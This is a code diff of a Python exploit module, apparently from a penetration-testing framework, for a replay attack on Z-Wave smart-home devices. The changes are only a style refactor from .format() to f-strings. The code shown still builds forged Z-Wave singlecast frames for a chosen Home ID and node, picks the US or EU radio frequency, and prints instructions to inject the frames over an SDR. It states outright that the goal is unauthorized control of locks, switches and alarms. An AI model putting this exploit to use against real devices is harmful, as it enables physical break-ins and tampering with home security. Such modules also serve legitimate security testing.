@@ -146,14 +146,14 @@ class Exploit(Exploit):
         custom = self.custom_payload.strip()
         if custom:
             try:
-                return bytes.fromhex(custom), "Custom (0x{})".format(custom[:16])
+                return bytes.fromhex(custom), f"Custom (0x{custom[:16]})"
             except ValueError:
                 return None, "Invalid hex"
 
         cmd_key = self.command.strip().lower()
         if cmd_key in _COMMON_COMMANDS:
             return _COMMON_COMMANDS[cmd_key]
-        return None, "Unknown command: {}".format(cmd_key)
+        return None, f"Unknown command: {cmd_key}"
 
     @mute
     def check(self):
@@ -165,24 +165,24 @@ class Exploit(Exploit):
 
         hid = self._parse_home_id()
         if hid is None:
-            print_error("Invalid Home ID: {}".format(self.home_id))
+            print_error(f"Invalid Home ID: {self.home_id}")
             return
 
         payload, cmd_desc = self._get_command_payload()
         if payload is None:
-            print_error("Invalid command: {}".format(cmd_desc))
+            print_error(f"Invalid command: {cmd_desc}")
             return
 
         freq = 908420000 if self.region.strip().upper() == "US" else 868420000
 
-        print_info("Home ID: 0x{:08X}".format(hid))
-        print_info("Source node: {}, Target node: {}".format(self.src_node, self.dst_node))
-        print_info("Command: {} ({})".format(self.command, cmd_desc))
-        print_info("Frequency: {} Hz ({})".format(freq, self.region))
+        print_info(f"Home ID: 0x{hid:08X}")
+        print_info(f"Source node: {self.src_node}, Target node: {self.dst_node}")
+        print_info(f"Command: {self.command} ({cmd_desc})")
+        print_info(f"Frequency: {freq} Hz ({self.region})")
 
         frame = _build_zwave_singlecast(hid, int(self.src_node), int(self.dst_node), payload)
-        print_info("Z-Wave frame: {} bytes".format(len(frame)))
-        print_info("Frame hex: {}".format(frame.hex()))
+        print_info(f"Z-Wave frame: {len(frame)} bytes")
+        print_info(f"Frame hex: {frame.hex()}")
 
         replay_frames = []
         for i in range(int(self.replay_count)):
@@ -201,15 +201,13 @@ class Exploit(Exploit):
         print_table(cmd_headers, *cmd_rows, title="Available Replay Commands")
 
         print_info("Replay parameters:")
-        print_info("  Replays: {}".format(self.replay_count))
-        print_info("  Interval: {:.1f}s".format(float(self.replay_interval)))
-        print_info("  Total duration: {:.1f}s".format(
-            int(self.replay_count) * float(self.replay_interval),
-        ))
+        print_info(f"  Replays: {self.replay_count}")
+        print_info(f"  Interval: {float(self.replay_interval):.1f}s")
+        print_info(f"  Total duration: {int(self.replay_count) * float(self.replay_interval):.1f}s")
 
         print_warning("Z-Wave replay attack: no S2 = no replay protection")
         print_info("Impact: unauthorized physical control (locks, switches, alarms)")
         print_info(
-            "To execute: configure SDR '{}' on {} Hz with Z-Wave "
-            "modulation and inject frames".format(self.interface, freq)
+            f"To execute: configure SDR '{self.interface}' on {freq} Hz with Z-Wave "
+            "modulation and inject frames"
         )
